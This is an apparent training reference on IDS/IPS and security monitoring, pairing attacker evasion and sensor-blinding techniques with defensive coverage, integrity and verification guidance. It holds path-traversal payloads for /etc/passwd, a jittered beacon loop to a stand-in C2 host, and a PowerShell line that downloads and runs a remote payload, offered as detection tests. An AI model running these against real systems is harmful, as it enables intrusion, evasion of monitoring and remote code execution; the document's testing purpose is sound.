# IDS IPS and Monitoring (Offensive and Defensive)

> [!CAUTION]
> This reference is for authorized penetration testing and defensive engineering only. Every technique here assumes written authorization and an isolated lab or a production change window approved by the asset owner.

## 1. Overview

An intrusion detection system (IDS) watches traffic and raises alerts; an intrusion prevention system (IPS) watches traffic and blocks it. Monitoring is the broader layer that collects, stores, and correlates the telemetry that the IDS/IPS, the firewall, the endpoints, and the network devices produce. Together they are the sensor network that a defender uses to see what is happening, and that an attacker must understand to avoid or survive detection.

The families worth knowing:

- **Network IDS (NIDS).** Passive sensor on a tap or SPAN port. Signature-based (Snort, Suricata) or anomaly-based. Sees packets, cannot block. A NIDS that is bypassed produces no alert, which is the attacker's goal.
- **Network IPS (NIPS).** Inline sensor that can drop or reset. Same detection engines as NIDS, but with the authority to act. The inline position is both its power and its risk: a parsing bug or a fail-open mode is a bypass.
- **Host IDS/IPS (HIDS/HIPS).** Agent on the endpoint: file integrity monitoring, process telemetry, syscall auditing (Wazuh, OSSEC, CrowdStrike, Defender for Endpoint). Sees what the network does not: local privilege escalation, credential access, lateral movement inside the host.
- **Network traffic analysis (NTA/NDR).** Flow-based and metadata-based detection (Zeek, NetFlow, Cisco Stealthwatch, Darktrace). Detects patterns that signatures miss: beaconing, data staging, unusual peer-to-peer.
- **SIEM and SOAR.** The correlation layer (Splunk, Elastic, Sentinel, QRadar) plus automation (SOAR). The SIEM is where alerts become incidents; the SOAR is where incidents become actions.

The recurring theme: detection is a data problem. The attacker's job is to produce telemetry that looks benign, or to produce none at all. The defender's job is to make sure the interesting actions cannot happen without leaving a trace.

## 2. Reconnaissance / Enumeration

Enumeration of a detection stack has one goal: understand what the sensors see and what they miss. An attacker who knows the sensor positions and rules can design traffic that does not trigger them.

### Offensive

- **Identify the sensor position.** A tap and a SPAN port see different traffic; an inline IPS sees everything but can be probed. A network that mirrors only north-south traffic misses east-west lateral movement entirely.
- **Fingerprint the IDS/IPS.** Response to known test signatures (a benign `alert` signature hit), reset behavior, and timing all hint at the product. Snort, Suricata, and vendor engines respond differently to the same malformed packet.
- **Map the signature set.** Public rule sets (ET Open, Snort community) are known. A custom rule set is not, but a differential response to a known-benign trigger can reveal whether a custom rule is present.
- **Test evasion primitives.** Fragmentation, overlapping segments, TTL manipulation, and TCP segmentation offload (TSO) behavior on the sensor. A sensor that does not reassemble like the endpoint will miss what the endpoint accepts.
- **Probe the logging pipeline.** Send traffic that should be logged and check whether it reaches the SIEM, whether it is delayed, and whether the attacker's source is excluded. A logging gap is a detection gap.
- **Fingerprint the EDR.** On a host, look at running processes, kernel modules, and network connections to the EDR cloud. A host without an EDR agent is a blind spot.

### Defensive

- **Inventory every sensor and its coverage.** Each network segment, each host class, and each data source should map to a sensor. An unmonitored segment is a finding.
- **Test that the sensors are actually receiving traffic.** A SPAN port that was misconfigured years ago and never re-checked is a common silent failure.
- **Baseline the alert volume.** Know the normal rate of alerts per sensor so that a drop to zero (sensor failure) or a spike (real attack or a new noisy rule) is visible.

## 3. Common Attack Vectors

Detection attacks fall into three groups: evade the sensor, blind the sensor, and abuse the alert pipeline.

**Evasion (the traffic is malicious but the sensor does not alert):**

- **Fragmentation and segmentation tricks.** Overlapping IP fragments, tiny fragments, and TCP segment overlap that the sensor reassembles differently from the endpoint. The classic IDS evasion from the late 1990s still works against sensors with the wrong reassembly policy.
- **Encoding and obfuscation.** URL encoding, Unicode, HTML entities, and case variation in payloads that the signature does not normalize. A signature that matches `../` misses `..%2f` unless the sensor decodes.
- **Protocol tunneling.** Malicious payload inside DNS, ICMP, or HTTPS. A signature-based NIDS sees a DNS query; an NTA sees a beacon.
- **Slow and low.** Beacons with jitter, low volume, and long intervals that never cross the volume threshold. The classic C2 pattern that evades volume-based detection.
- **Living off the land.** Using legitimate tools (PowerShell, WMI, certutil) so that the process tree looks normal. Signature-based detection fails because the binary is signed and expected.

**Blinding (the sensor is disabled, bypassed, or fed bad data):**

- **Sensor bypass.** Route traffic around the inline IPS (a second path), or make the traffic fail-open (a crash or a resource exhaustion that puts the IPS into bypass mode).
- **Log tampering.** On a compromised host, delete or modify the local logs before they are shipped. Clear the Windows event log, truncate `/var/log`, and stop the agent.
- **Agent kill.** Disable or uninstall the EDR agent, or block its cloud connection. A host that cannot reach the EDR cloud is a host that the SOC cannot see.
- **SPAN port manipulation.** On a compromised switch, remove or redirect the SPAN session so that the NIDS sees nothing.

**Alert pipeline abuse:**

- **Alert flooding.** Generate a large volume of low-value alerts to bury the real one. The SOC's alert fatigue is an attack surface.
- **False-flag injection.** Trigger an alert that points to an innocent host, sending the SOC in the wrong direction.
- **Rule disablement.** On a compromised management plane, disable the rule that would catch the attacker, or add an exclusion for the attacker's source.

The common thread: detection is only as good as the sensor's parsing and the pipeline's integrity. Evasion targets the parser; blinding targets the pipeline.

## 4. Exploitation Recipes

All commands and tests below are run only against systems you own or have written authorization to test.

### Recipe 1 - Test IDS/IPS evasion with fragmentation

```bash
# Send a request fragmented into tiny pieces (sensor reassembly test)
sudo fragroute -f 10.10.10.1

# Or use hping3 with small fragment size
sudo hping3 -S -p 80 -f 10.10.10.1 -c 5
```

Expected: if the IDS alerts on the fragmented version but the target still responds normally, the sensor is reassembling correctly. If the target responds but the IDS does not alert, the sensor is evadable.

### Recipe 2 - Encoding variation against a signature

```bash
# Classic traversal (likely to trigger a signature)
curl -s "https://target.example/?file=../../etc/passwd"

# URL-encoded traversal (tests signature normalization)
curl -s "https://target.example/?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd"

# Double-encoded traversal (tests double-decode)
curl -s "https://target.example/?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd"
```

Expected: if the first triggers a WAF/IPS block and the encoded variants do not but still reach the backend, the sensor is not normalizing. That is the evasion primitive.

### Recipe 3 - Check logging pipeline integrity

```bash
# On a compromised host, check whether logs are shipping
systemctl status rsyslog
systemctl status auditd
# Windows: check the event log service and the EDR agent
sc query eventlog
sc query "CrowdStrike Falcon"
```

Expected: if the agent is stopped or the log service is disabled, the host is blind. That is a detection gap the attacker can exploit.

### Recipe 4 - Slow-and-low beacon simulation (lab only)

```bash
# Beacon every 5-15 minutes with jitter, low volume, over HTTPS
while true; do
  curl -s -o /dev/null "https://c2.example/beacon?id=$(hostname)"
  sleep $((300 + RANDOM % 600))
done
```

Expected: a volume-based NTA should not alert (volume is low); a beacon-detection rule based on periodicity and jitter should. If neither alerts, the C2 channel is invisible.

### Recipe 5 - Verify the SIEM is receiving the sensor data

```bash
# Send a request that should be logged and check the SIEM for the corresponding event
curl -s -o /dev/null "https://target.example/__test_marker_$(date +%s)"
# In the SIEM, search for the marker within the expected window
```

Expected: the marker appears in the SIEM within the expected log latency (usually under a minute). If it does not, the pipeline is broken or the sensor is not covering that path.

## 5. Post-Exploitation

Once the detection stack is understood or compromised, the post-exploitation options are about staying invisible.

**Sensor mapping.** The attacker's map of the sensor positions, the rules, and the logging pipeline is a persistence asset. It tells the attacker which segments are blind and which actions leave no trace.

**Log suppression.** The first post-exploitation step on a host is often to stop the agent, disable the log service, or clear the local logs. On a network device, it is to redirect syslog or remove the SPAN session. The goal is to make the attacker's actions produce no telemetry.

**Beacon design.** C2 that survives detection: jitter, low volume, legitimate-looking domains (domain fronting, CDN fronting), and protocols that the sensor parses as benign (HTTPS to a CDN). The beacon is designed against the sensor, not the firewall.

**Lateral movement without network signatures.** Using the same protocols and the same tools the environment expects (SMB, WMI, WinRM with valid credentials) so that the traffic looks like normal administration.

**Detection poisoning.** Feeding false data to the SIEM (false-flag alerts), or triggering so many low-value alerts that the real one is buried.

**Persistence that survives reboots.** A scheduled task, a service, or a WMI subscription that re-establishes the beacon after every reboot, so that a single cleanup by the SOC does not remove the attacker.

## 6. Preventive Controls

Detection hardening is about coverage, integrity, and signal quality.

**Coverage:**

```text
! Every segment has a sensor or a documented reason why not
! Every host class has an EDR agent (servers, workstations, cloud)
! North-south AND east-west traffic is monitored
! DNS, HTTP, SMB, and authentication are logged at the source
! Cloud control-plane logs (CloudTrail, Azure Activity, GCP Audit) are on
```

- **Segment coverage.** Every network segment is either monitored or documented as accepted risk. A blind segment is a finding.
- **Host coverage.** Every server, workstation, and cloud instance has an EDR agent. A host without an agent is a blind spot.
- **Protocol coverage.** DNS, HTTP, SMB, and authentication are the protocols attackers use most. Log them at the source (DNS server, web server, domain controller), not only on the network.
- **Cloud control plane.** CloudTrail, Azure Activity Log, and GCP Audit Logs are the detection layer for cloud-native attacks. Enable them in every account and region.

**Integrity:**

- **Tamper-proof log shipping.** Logs are shipped to the SIEM in real time and the local copy can be deleted without losing the remote copy. A host that loses its logs on compromise is a blind spot.
- **Agent protection.** The EDR agent cannot be stopped by a non-admin user and its cloud connection is protected against tampering.
- **Sensor redundancy.** Two sensors on the same critical segment, or a flow-based sensor plus a packet-based sensor, so that a single sensor failure does not create a blind spot.

**Signal quality:**

- **Tuning.** Reduce false positives so that the SOC can act on the real alerts. An untuned SIEM is an alert-fatigue generator.
- **Detection engineering.** Every detection rule has an owner, a test case, and a false-positive budget. A rule that fires constantly and is ignored is worse than no rule.
- **Threat-informed detection.** Map every detection rule to a MITRE ATT&CK technique. The coverage map shows the gaps.

## 7. Detection Controls

**Network sensor telemetry:**

- Signature hits from the NIDS/NIPS, correlated across sensors by source and destination.
- Flow-level anomalies: beaconing, data staging, unusual peer-to-peer, volume per host.
- DNS anomalies: high-entropy subdomains, long TXT records, unusual volume to one resolver.

**Host sensor telemetry:**

- Process creation with suspicious parent-child relationships (Office spawning PowerShell, a web server spawning cmd.exe).
- Credential access (LSASS access, SAM read, Kerberos ticket requests).
- File integrity changes in critical paths.
- Persistence mechanisms (new scheduled task, new service, new WMI subscription).

**Authentication telemetry:**

- Failed logins followed by a success from the same source (password spray).
- Logins from new geographies or impossible travel.
- Privileged account use outside a change window.

**Example Suricata and Zeek telemetry:**

```text
! Suricata: log every alert with the flow and the packet
outputs:
  - eve-log:
      enabled: yes
      types: [alert, flow, dns, http, tls]
! Zeek: log DNS, HTTP, and connection summaries
@load protocols/dns
@load protocols/http
```

The high-value SIEM alert is a chain: a new process with a suspicious parent, followed by an outbound connection to a new destination, followed by a credential access. Each event alone is noise; together they are an intrusion.

## 8. Verification

How to verify that the detection stack is working.

**Verify network sensor coverage:**

```bash
# Send a request that a known signature should catch, and check the SIEM
curl -s "https://target.example/?file=../../etc/passwd"
# Expect: a NIDS/NIPS alert in the SIEM within the log latency window
```

**Verify host sensor coverage:**

```bash
# On a test host, run a known-suspicious command and check the EDR console
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://test.example/payload')"
# Expect: a detection in the EDR console within minutes
```

**Verify logging pipeline integrity:**

- Stop the local log service on a test host. The SIEM must already have the logs (shipped before the stop) and must alert on the "agent stopped" event.
- Disable the EDR agent on a test host. The EDR console must alert on the tamper attempt.

**Verify detection coverage against ATT&CK:**

- For each technique in the threat model, confirm there is at least one detection rule mapped to it. The coverage map is the verification artifact.

**The verification habit:** after every change to the network or the detection rules, re-run the coverage test for the affected segment. A silent coverage gap is the most common detection failure.

## 9. Certification Alignment

**CompTIA Network+ (N10-009):**

- Domain 3: Network Operations - monitoring, SNMP, flow data.
- Domain 4: Network Security - IDS/IPS, monitoring.

**Cisco CCNA (200-301):**

- Domain 5: Security Fundamentals - IPS, monitoring, logging.

**Cisco CyberOps Associate (200-201 CBROPS):**

- Detection engineering, network intrusion analysis, security monitoring.

**CompTIA CySA+ (CS0-003):**

- Domain 2: Vulnerability Management - detection coverage.
- Domain 3: Incident Response - detection and analysis.

**CompTIA Security+ (SY0-701):**

- Domain 4: Operations and Incident Response - monitoring, SIEM, IDS/IPS.

**Cross-references:**

- 01 Network Fundamentals covers the layer 1-3 basics the sensor watches.
- 02 Routing and Switching covers the routing that shapes the traffic the sensor sees.
- 03 Network Devices covers the firewalls and proxies that feed the sensor.
- 05 Traffic Analysis and Forensics covers how the sensor data is captured and investigated.

## 10. Production Notes

**Detection is a data problem, not a tool problem.** A sensor that is not deployed in the right place, or a SIEM that is not tuned, produces nothing useful. The tool matters far less than the coverage and the signal quality.

**The blind spot is the attacker's target.** Every unmonitored segment, every host without an EDR agent, and every disabled log source is a place an attacker can operate without being seen. Finding and closing the blind spots is the first detection task.

**Integrity is the foundation.** A log that can be deleted by the attacker is not a detection control. Ship logs off-host in real time, and protect the agent from tampering.

**Alert fatigue is a security risk.** A SOC that is buried in false positives misses the real alert. Tuning is not optional; it is the difference between a working detection stack and a noisy one.

**Detection engineering is a discipline.** Every rule needs an owner, a test case, and a false-positive budget. The rules are code: version them, test them, review them.

**Map to ATT&CK.** The MITRE ATT&CK coverage map turns "we have a lot of rules" into "we can detect these techniques and not those". It is the only way to know what the detection stack actually covers.

## 11. References

- NIST SP 800-94 (Guide to Intrusion Detection and Prevention Systems) - https://csrc.nist.gov/pubs/sp/800/94/final
- NIST SP 800-92 (Guide to Computer Security Log Management) - https://csrc.nist.gov/pubs/sp/800/92/final
- NIST SP 800-137 (Information Security Continuous Monitoring) - https://csrc.nist.gov/pubs/sp/800/137/final
- MITRE ATT&CK - https://attack.mitre.org/
- MITRE D3FEND - https://d3fend.mitre.org/
- Snort Documentation - https://www.snort.org/documents
- Suricata Documentation - https://docs.suricata.io/
- Zeek Documentation - https://docs.zeek.org/
- Wazuh Documentation - https://documentation.wazuh.com/
- CompTIA Network+ exam objectives - https://www.comptia.org/certifications/network
- Cisco CCNA exam topics - https://learningnetwork.cisco.com/s/ccna-exam-topics
